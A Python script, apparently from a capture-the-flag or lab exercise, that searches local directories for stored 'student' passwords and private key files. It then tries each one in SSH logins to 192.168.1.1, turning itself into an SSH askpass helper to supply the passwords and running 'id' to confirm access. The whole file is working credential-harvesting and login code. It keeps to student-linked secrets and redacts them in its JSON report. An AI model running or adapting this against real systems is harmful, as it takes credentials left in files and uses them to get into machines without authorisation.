#!/usr/bin/env python3
import json
import os
import re
import shutil
import subprocess
import sys

# OpenSSH invokes this same file as its askpass helper for a supported password.
if os.environ.get("STUDENT_ASKPASS_MODE") == "1":
    sys.stdout.write(os.environ.get("STUDENT_ASKPASS_SECRET", ""))
    raise SystemExit(0)

TARGET = "192.168.1.1"
USER = "student"
GENERATED_DIR = os.path.realpath("/root/scripts")
EXCLUDED_DIRS = {".git", "__pycache__", "node_modules", ".cache", ".ssh"}
STUDENT_PAIR = re.compile(r"\bstudent\s*[:=]\s*([^\s,;]+)", re.IGNORECASE)
STUDENT_PASSWORD = re.compile(
    r"\b(?:password|passwd|pass)\s*(?:for\s+student|student)\s*[:=]\s*([^\s,;]+)",
    re.IGNORECASE,
)
PRIVATE_KEY = re.compile(r"-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----")


def examine_materials():
    roots = []
    for path in (os.getcwd(), "/challenge", "/root"):
        if os.path.isdir(path):
            real = os.path.realpath(path)
            if real not in roots:
                roots.append(real)

    examined_files = 0
    unreadable_files = []
    credential_records = []
    credentials = []
    key_paths = []
    seen_files = set()

    for root in roots:
        for current, dirs, filenames in os.walk(root, followlinks=False):
            current_real = os.path.realpath(current)
            kept = []
            for dirname in dirs:
                candidate = os.path.realpath(os.path.join(current, dirname))
                if dirname in EXCLUDED_DIRS or candidate == GENERATED_DIR or candidate.startswith(GENERATED_DIR + os.sep):
                    continue
                kept.append(dirname)
            dirs[:] = kept

            for filename in filenames:
                path = os.path.join(current, filename)
                real = os.path.realpath(path)
                if real in seen_files or real == os.path.realpath(__file__):
                    continue
                if real == GENERATED_DIR or real.startswith(GENERATED_DIR + os.sep):
                    continue
                seen_files.add(real)
                try:
                    if not os.path.isfile(path):
                        continue
                    found_key = False
                    text_lines = []
                    with open(path, "r", encoding="utf-8", errors="strict") as stream:
                        for line_number, line in enumerate(stream, 1):
                            if PRIVATE_KEY.search(line):
                                found_key = True
                            text_lines.append((line_number, line.rstrip("\n")))
                    examined_files += 1
                except (OSError, UnicodeError):
                    unreadable_files.append(path)
                    continue

                if found_key:
                    key_paths.append(path)
                file_mentions_student = any(re.search(r"\bstudent\b", line, re.IGNORECASE) for _, line in text_lines)
                for line_number, line in text_lines:
                    match = STUDENT_PAIR.search(line)
                    value = match.group(1).strip().strip("'\"`") if match else None
                    # A generic password is accepted only when the same line explicitly
                    # associates it with student; unrelated passwords are not tested.
                    if value is None:
                        match = STUDENT_PASSWORD.search(line)
                        value = match.group(1).strip().strip("'\"`") if match else None
                    if value and value.lower() not in {"student", "username", "user"}:
                        item = (real, value)
                        if item not in credentials:
                            credentials.append(item)
                            credential_records.append({
                                "path": path,
                                "line": line_number,
                                "finding": "explicit student credential-like entry",
                                "secret": "[REDACTED]",
                            })

    return {
        "roots_examined": roots,
        "excluded_generated_directory": GENERATED_DIR,
        "excluded_directories_by_name": sorted(EXCLUDED_DIRS),
        "text_files_examined": examined_files,
        "unreadable_or_non_utf8_files": unreadable_files,
        "credential_findings": credential_records,
        "private_key_paths": key_paths,
    }, credentials, key_paths


def public_reference():
    url = "https://security-tracker.debian.org/tracker/source-package/openssh"
    try:
        import framework_evidence
        envelope = framework_evidence.run_tool([
            "curl", "--fail", "--silent", "--show-error", "--location",
            "--max-time", "20", url,
        ])
        return {"url": url, "tool_envelope": envelope}
    except Exception as exc:
        return {"url": url, "error": "%s: %s" % (type(exc).__name__, exc)}


def ssh_attempts(credentials, key_paths):
    ssh = shutil.which("ssh")
    if not ssh:
        return [{"status": "not_attempted", "reason": "ssh executable is not available in PATH"}]

    results = []
    askpass_ready = False
    script_path = os.path.realpath(__file__)
    if credentials:
        try:
            os.chmod(script_path, 0o700)
            askpass_ready = os.access(script_path, os.X_OK)
        except OSError:
            askpass_ready = False

    common = [
        ssh, "-T", "-o", "ConnectTimeout=8", "-o", "ConnectionAttempts=1",
        "-o", "StrictHostKeyChecking=accept-new", "-o", "LogLevel=VERBOSE",
        "-o", "NumberOfPasswordPrompts=1",
    ]
    destination = USER + "@" + TARGET

    if key_paths:
        for key_path in key_paths:
            argv = common + [
                "-o", "BatchMode=yes", "-o", "IdentitiesOnly=yes",
                "-i", key_path, destination, "id",
            ]
            try:
                completed = subprocess.run(argv, stdin=subprocess.DEVNULL,
                                           stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                           text=True, timeout=15, check=False)
                results.append({
                    "method": "private key found in examined local material",
                    "key_path": key_path,
                    "exit_code": completed.returncode,
                    "stdout": completed.stdout,
                    "stderr": completed.stderr,
                })
            except (OSError, subprocess.TimeoutExpired) as exc:
                results.append({"method": "private key", "key_path": key_path,
                                "error": "%s: %s" % (type(exc).__name__, exc)})

    for source_path, secret in credentials:
        if not askpass_ready:
            results.append({"method": "explicit student credential",
                            "source_path": source_path,
                            "status": "not_attempted",
                            "reason": "could not make this script available as an SSH askpass helper"})
            continue
        argv = common + [
            "-o", "PreferredAuthentications=password,keyboard-interactive",
            "-o", "PubkeyAuthentication=no", destination, "id",
        ]
        env = os.environ.copy()
        env.update({
            "SSH_ASKPASS": script_path,
            "SSH_ASKPASS_REQUIRE": "force",
            "DISPLAY": env.get("DISPLAY", ":0"),
            "STUDENT_ASKPASS_MODE": "1",
            "STUDENT_ASKPASS_SECRET": secret,
        })
        try:
            completed = subprocess.run(argv, stdin=subprocess.DEVNULL,
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       text=True, timeout=15, check=False, env=env)
            results.append({
                "method": "explicit student credential found in local material",
                "source_path": source_path,
                "exit_code": completed.returncode,
                "stdout": completed.stdout,
                "stderr": completed.stderr,
            })
        except (OSError, subprocess.TimeoutExpired) as exc:
            results.append({"method": "explicit student credential",
                            "source_path": source_path,
                            "error": "%s: %s" % (type(exc).__name__, exc)})
    if not results:
        results.append({"status": "not_attempted",
                        "reason": "No explicit student credential or private key was found in examined local materials"})
    return results


def main():
    materials, credentials, key_paths = examine_materials()
    reference = public_reference()
    attempts = ssh_attempts(credentials, key_paths)
    print(json.dumps({
        "target": TARGET,
        "user_under_test": USER,
        "material_review": materials,
        "public_reference": reference,
        "ssh_attempts": attempts,
        "interpretation": "Only explicitly identified student credentials or private keys from the examined local material were attempted. The public version/security information is not itself proof of a vulnerable path. A successful remote id response is the session identity evidence.",
    }, ensure_ascii=False))


if __name__ == "__main__":
    main()

